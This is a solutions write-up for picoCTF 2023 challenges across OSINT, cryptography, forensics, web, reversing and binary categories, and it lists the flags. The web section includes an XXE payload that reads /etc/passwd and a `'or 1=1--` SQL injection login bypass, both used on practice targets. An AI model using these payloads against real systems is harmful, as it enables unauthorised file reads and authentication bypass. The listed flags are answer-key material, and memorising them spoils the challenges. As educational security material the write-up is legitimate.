# picoCTF 2023

## General Skill
### • money-ware (100pts/osint)
Flag format: picoCTF{Malwarename}. The first letter of the malware name should be capitalized and the rest lowercase.Your friend just got hacked and has been asked to pay some bitcoins to  `1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX`. He doesn’t seem to understand what is going on and asks you for advice. Can you identify what malware he’s being a victim of?
#### Steps:
Google dork the bitcoin address, we can see a lot of news talking about the ransomware including the malware name.
```
picoCTF{Petya}
```
### • useless (100pts)
There's an interesting script in the user's home directory.

#### Steps:
Given an SSH connection. After the connection is established, using `ls` command we can see that there is 1 executable program. When running, the program, it asked to read the code. When I read the code, it asked to run the manual `man`. Then we get the flag.
```
picoCTF{us3l3ss_ch4ll3ng3_3xpl0it3d_5562}
```
### • chrono (100pts)
FLAG: ``picoCTF{Sch3DUL7NG_T45K3_L1NUX_7754e199}``

### • permissions (100pts)
FLAG: ``picoCTF{uS1ng_v1m_3dit0r_021d10ab}``


## Cryptography
### • HideToSee (100pts)
How about some hide and seek heh? Look at this image  [here](https://artifacts.picoctf.net/c/507/atbash.jpg).
#### Steps:
Given a stego-image. Simply decode with online steganography decoder then we get the encrypted text: ``krxlXGU{zgyzhs_xizxp_7867098z}``. Decode it with atbash decoder (as the image itself is an image of atbash cipher), then we get the flag.
```
picoCTF{atbash_crack_7867098a}
```

## Forensic
### • hideme (100pts)
Every file gets a flag.The SOC analyst saw one image been sent back and forth between two people. They decided to investigate and found out that there was more than what meets the eye  [here](https://artifacts.picoctf.net/c/493/flag.png).
#### Steps:
Extract the image with binwalk. Open the folder named secret, then we get the flag.
```
picoCTF{Hiddinng_An_imag3_within_@n_ima9e_5cf64968}
```
### • PcapPoisoning (100pts)
How about some hide and seek heh? Download this  [file](https://artifacts.picoctf.net/c/404/trace.pcap)  and find the flag.

#### Steps:
Given a .pcap file with FTP connection. Once I know there is FTP connection, I filter out ftp and ftp-data directly, analyze the packets, and follow the TCP stream. I found the FTP request for login and I followed the stream and we get the flag.
```
picoCTF{P64P_4N4L7S1S_SU55355FUL_dd89e21b}
```
### • FindAndOpen (200pts)
Someone might have hidden the password in the trace file. Find the key to unlock  [this file](https://artifacts.picoctf.net/c/288/flag.zip).  [This tracefile](https://artifacts.picoctf.net/c/288/dump.pcap)  might be good to analyze.
#### Steps:
Given a .pcap file and a protected zip file. Inside the pcap, there is only 2 protocol (Ethernet data and MDNS). A bit of analyzing we can get a base64 decoded string which contains the zip password.
```
picoCTF{R34DING_LOKd_fil56_succ3ss_8ec01288}
```

### • who is it (100pts)
Someone just sent you an email claiming to be Google's co-founder Larry Page but you suspect a scam. Can you help us identify whose mail server the email actually originated from? Download the email file  [here](https://artifacts.picoctf.net/c/319/email-export.eml). Flag: picoCTF{FirstnameLastname}

#### Steps:
Given .eml file. Analyze using hex editor we get some information such as IP addresses. Look it up using WhoIs we can get the IP information including name: https://whois.domaintools.com/173.249.33.206
```
picoCTF{WilhelmZwalina}
```

### • MSB (200pts)
This image passes LSB statistical analysis, but we can't help but think there must be something to the visual artifacts present in this image..
#### Steps:
The challenge gives us a picture and gives some hints that data is hidden by MSB. This gives us the chance to use `stegsolve`.
By going through the color planes, we can see an output that doesn't really feel the same like the others. I extracted the data by row and got the flag!
(pic)
```
picoCTF{15_y0ur_que57_qu1x071c_0r_h3r01c_b5e03bc5}
```

## Web Exploitation
### • findme (100pts)
Help us test the form by submiting the username as `test` and password as `test!`
#### Step:
Burp Suite all the way. Request:
```
GET /next-page/id=cGljb0NURntwcm94aWVzX2Fs HTTP/1.1
```
Response:
```html
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 264

<!DOCTYPE html>
<head>
    <title>flag</title>
</head>
<body>
    <script>
        setTimeout(function () {
           // after 2 seconds
           window.location = "/next-page/id=bF90aGVfd2F5XzAxZTc0OGRifQ==";
        }, 0.5)
      </script>
    <p></p>
</body>
```
Decode both base64 encoding and we get the flag.
```
picoCTF{proxies_all_the_way_01e748db}
```

### • SOAP (100pts/xxe)
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?

#### Steps:
The website is using XML to submit data to the server.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<data><ID>2</ID></data>
```
XXE is a web security vulnerability that allows an attacker to interfere with an application’s processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any backend or external systems that the application itself can access.
Read more: https://csea-iitb.github.io/IITBreachers-wiki/2020/07/22/XXE.html

Payload:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<data><ID>&xxe;</ID></data>
```
This XXE payload defines an external entity &xxe; whose value is the contents of the /etc/passwd file and uses the entity within the ID value.
```
picoCTF{XML_3xtern@l_3nt1t1ty_55662c16}
```
### • More SQLi (200pts)
Given a website that prompts common login forms. Easy payload.
`` username: 'or 1=1-- | password: 'or 1=1-- ``

```
picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_62aa7500}
```

## Reverse Engineering
### • No Way Out (200pts)
Given a unity game that we can play like an FPS game. The character is trapped in a four-walled prison but without roof. We also can see a big flag outside the prison. The goal is to escaped the building and get to the flag.

As usual, we can decompile or disassemble and interpret it into a high level programming language using **[dnSpy](https://github.com/dnSpy/dnSpy)**. To access the main code/functions, we can open the `Assembly-CSharp.dll` (located under /managed folder).

(pic)
In the assembly explorer panel, we can  see multiple classes and its name. Since the goal is to make the character escaped from the prison, we want to modify how the characters move instead of other feature, hence we look into ``PlayerController`` class.
```java
if  (Input.GetButton("Jump")  &&  this.canMove  &&  this.characterController.isGrounded  &&  !this.isClimbing){  
this.moveDirection.y  =  this.jumpSpeed;  
}  
else{  
this.moveDirection.y  =  y;  
}
//lines of code
private  float  jumpSpeed  =  6f;
```
Then I the ``moveDirection.y`` into 50 or 100, so that when the Jump is called (or when I press space), I can jump like a kangaroo. Save the module and play it.


(youtube link)

```
picoCTF{WELCOME_TO_UNITY!!}
```

### • Ready Gladiator 0 (100pts)
Can you make a CoreWars warrior that always loses, no ties?

#### Steps:
> CoreWars is a programming game where assembly programs try to find ways to destroy each other in a computer simulation's memory. The language used in CoreWars is Redcode, an assembly language

So what does Redcode look like? The simplest CoreWars program is Imp:
```
mov 0, 1
```
This is a simple assembly statement that copies the line at address 0 to the line at address 1.
Since the challenge asked us to always lose, so once it is connected, we just need to ``end`` and let the computer win.
```
picoCTF{h3r0_t0_z3r0_4m1r1gh7_e1610ed2}
```
Read more:
https://vyznev.net/corewar/guide.html
https://thenewstack.io/core-wars-shows-the-battle-webassembly-needs-to-win/

### • Ready Gladiator 1 (200pts)
Can you make a CoreWars warrior that wins?

#### Steps:
> The actual win condition for a Core War warrior is to force the opponent to execute a rogue “DAT” instruction. So let us end our quick sojourn into Core War by looking at a slightly more sophisticated program that drops “DAT” bombs.

This is the warrior program known as the **Dwarf**:
```
ADD  #4, 3
MOV  2,  @2
JMP  -2
DAT  #0, #0
```
That “JMP” instruction creates a simple loop — the program jumps from the third line back two steps to the first line again. The first line ADDs the number 4 to the DAT statement three lines down. Then the MOV statement copies the DAT statement two lines below a number of lines, depending on the value in the second field of the DAT statement. And that number starts off at 0, but remember the ADD statement…

In short, the Dwarf is really an artillery unit, altering the launch angle then firing DAT shells further and further down the battlefield. So whereas the Imp replicates itself, the Dwarf remains in position and shoots. Quite different mechanisms, even in small bits of code that wreak havoc.
```
picoCTF{1mp_1n_7h3_cr055h41r5_441be1fc}
```

### • timer (100pts)
FLAG: ``picoCTF{t1m3r_r3v3rs3d_succ355fully_17496}``

### • Safe Opener 2 (100pts)
FLAG: ``picoCTF{SAf3_0p3n3rr_y0u_solv3d_it_3dae8463}``

## Binary Exploit
### • two-sum (100pts)
What two positive numbers can make this possible:
 `n1 > n1 + n2 OR n2 > n1 + n2`
#### Steps:
The maximum value that can be stored in an `int` data type is `2147483647`. To create an overflow, we need to enter two positive integers whose sum is greater than this value. We can do this by entering `2000000000` for `num1` and `num2`. This will result in a sum of `4000000000`, which is greater than the maximum value that can be stored in an `int` data type.
```
picoCTF{Tw0_Sum_Integer_Bu773R_0v3rfl0w_fe14e9e9}
```
